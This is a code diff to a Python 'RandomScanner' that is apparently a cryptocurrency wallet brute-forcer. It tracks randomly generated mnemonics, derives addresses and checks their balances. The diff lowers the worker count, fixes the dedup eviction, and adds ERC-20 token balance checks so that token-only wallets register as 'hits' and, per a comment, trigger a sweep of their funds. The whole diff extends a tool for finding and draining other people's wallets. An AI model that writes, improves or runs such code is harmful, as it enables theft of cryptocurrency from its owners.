@@ -66,7 +66,7 @@ class RandomScanner:
 
     def __init__(
         self,
-        workers: int = 20,
+        workers: int = 5,
         api_concurrency: int = 50,
         chains: Optional[list[ChainConfig]] = None,
         hit_logger: Optional[HitLogger] = None,
@@ -292,9 +292,11 @@ class RandomScanner:
                     self._save_persistent_stats()
                     # Evict oldest exact-set entries when too large
                     if len(self._seen_mnemonics) > self._max_exact_dedup:
-                        self._seen_mnemonics = set(list(self._seen_mnemonics)[self._max_exact_dedup // 2:])
+                        keep = self._max_exact_dedup // 2
+                        self._seen_mnemonics = set(list(self._seen_mnemonics)[-keep:])
                     if len(self._seen_addresses) > self._max_exact_dedup:
-                        self._seen_addresses = set(list(self._seen_addresses)[self._max_exact_dedup // 2:])
+                        keep = self._max_exact_dedup // 2
+                        self._seen_addresses = set(list(self._seen_addresses)[-keep:])
 
                 if not addresses:
                     continue
@@ -503,6 +505,47 @@ class RandomScanner:
         except Exception as e:
             self._stats.api_errors += len(idx_addrs)
             logger.debug("Batch balance check error for %s: %s", chain_name, e)
+
+        # Check ERC-20 token balances for EVM chains (even if native balance is 0)
+        if chain_cfg.chain_type == ChainType.EVM and chain_cfg.tokens:
+            try:
+                from src.modules.crypto.balance.multicall import batch_check_token_balances
+                addr_list = [a.address for _, a in idx_addrs]
+                token_results = await batch_check_token_balances(
+                    addr_list, chain_cfg.tokens, rotated_cfg, client=self._client,
+                )
+                # Group by address
+                addr_tokens: dict[str, list] = {}
+                for tr in token_results:
+                    addr_tokens.setdefault(tr.address, []).append(tr)
+                # Update results for addresses with token balances
+                for idx, addr in idx_addrs:
+                    tokens = addr_tokens.get(addr.address, [])
+                    if tokens:
+                        existing = results[idx]
+                        # If native balance was 0, update the result with token info
+                        if existing and existing.balance == 0 and not existing.error:
+                            # Use first token as primary for result
+                            primary = tokens[0]
+                            token_summary = ", ".join(
+                                f"{t.balance:.4f} {t.token_symbol}" for t in tokens
+                            )
+                            logger.warning(
+                                "TOKEN HIT! %s on %s: %s",
+                                addr.address[:10], chain_name, token_summary,
+                            )
+                            # Update result so it triggers sweep and hit logging
+                            from src.modules.crypto.balance.checker import BalanceResult
+                            results[idx] = BalanceResult(
+                                address=addr.address, chain=chain_name,
+                                symbol=primary.token_symbol,
+                                balance=primary.balance,
+                                balance_raw=primary.balance_raw,
+                                usd_price=0.0, usd_value=0.0,
+                                derivation_path=addr.derivation_path,
+                            )
+            except Exception as e:
+                logger.debug("Token balance check error for %s: %s", chain_name, e)
 
         return results
 
